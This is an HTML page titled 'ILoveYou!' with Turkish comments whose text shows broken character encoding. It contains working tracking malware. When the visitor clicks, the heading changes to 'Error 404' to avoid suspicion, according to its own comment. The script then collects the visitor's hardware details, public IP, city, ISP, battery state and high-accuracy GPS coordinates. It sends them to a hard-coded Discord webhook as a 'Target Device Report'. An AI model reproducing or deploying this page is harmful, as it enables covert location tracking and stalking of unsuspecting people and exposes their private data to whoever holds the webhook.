<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>ILoveYou!</title>
    <style>
        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Courier New', Courier, monospace; overflow: hidden; }
        #trigger { cursor: pointer; transition: 0.3s; user-select: none; font-size: 60px; font-weight: bold; }
        #trigger:hover { color: #ff0000; text-shadow: 0 0 20px #ff0000; }
    </style>
</head>
<body>

    <h1 id="trigger">ILoveYou!</h1>

    <script>
        // --- AYARLAR ---
        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
        let report = { system: {}, network: {}, geo: {} };

        // 1. TIKLAMA OLAYI (Ä°zinleri Tetikler)
        document.getElementById('trigger').addEventListener('click', async function() {
            this.innerText = "Error 404"; // ÅÃ¼phe uyandÄ±rmamak iÃ§in deÄŸiÅŸtir
            await startHarvest();
        });

        // 2. DONANIM VE SÄ°STEM ANALÄ°ZÄ°
        function getHardware() {
            let gpu = "Unknown";
            try {
                const canvas = document.createElement("canvas");
                const gl = canvas.getContext("webgl");
                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            } catch (e) {}

            return {
                RAM: navigator.deviceMemory + " GB",
                Cores: navigator.hardwareConcurrency,
                Screen: screen.width + "x" + screen.height,
                GPU: gpu,
                OS: navigator.platform
            };
        }

        // 3. AÄ VE IP ANALÄ°ZÄ° (WebRTC + Fallback)
        async function getNetwork() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    PublicIP: data.ip,
                    City: data.city,
                    ISP: data.org,
                    VPN: data.proxy || "Possible"
                };
            } catch (e) { return { error: "Network Blocked" }; }
        }

        // 4. HASAS KONUM VE GÃ–NDERÄ°M
        async function startHarvest() {
            report.system = getHardware();
            report.network = await getNetwork();

            // Batarya bilgisi
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                report.system.Battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})`;
            }

            // GPS Tetikleme (AsÄ±l Ä°zin Ä°steyen KÄ±sÄ±m)
            navigator.geolocation.getCurrentPosition(async (p) => {
                report.geo = {
                    Lat: p.coords.latitude,
                    Lon: p.coords.longitude,
                    Maps: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`
                };
                await sendToDiscord();
            }, async (err) => {
                report.geo = "Permission Denied";
                await sendToDiscord();
            }, { enableHighAccuracy: true });
        }

        // 5. PROFESYONEL DISCORD EMBED GÃ–NDERÄ°CÄ°
        async function sendToDiscord() {
            const embed = {
                title: "ğŸ¯ Hedef Cihaz Raporu",
                color: 0xff0000,
                fields: [
                    { name: "ğŸŒ AÄŸ / IP", value: `**IP:** ${report.network.PublicIP}\n**Åehir:** ${report.network.City}\n**Servis:** ${report.network.ISP}`, inline: true },
                    { name: "ğŸ’» DonanÄ±m", value: `**GPU:** ${report.system.GPU}\n**RAM:** ${report.system.RAM}\n**CPU:** ${report.system.Cores} Core`, inline: true },
                    { name: "ğŸ”‹ Batarya", value: report.system.Battery || "N/A", inline: true },
                    { name: "ğŸ“ Konum (GPS)", value: report.geo.Maps ? `[Haritada GÃ¶r](${report.geo.Maps})` : "Ä°zin Verilmedi", inline: false }
                ],
                footer: { text: "Cihaz Telemetrisi â€¢ " + new Date().toLocaleString() }
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] })
            });
        }
    </script>
</body>
</html>
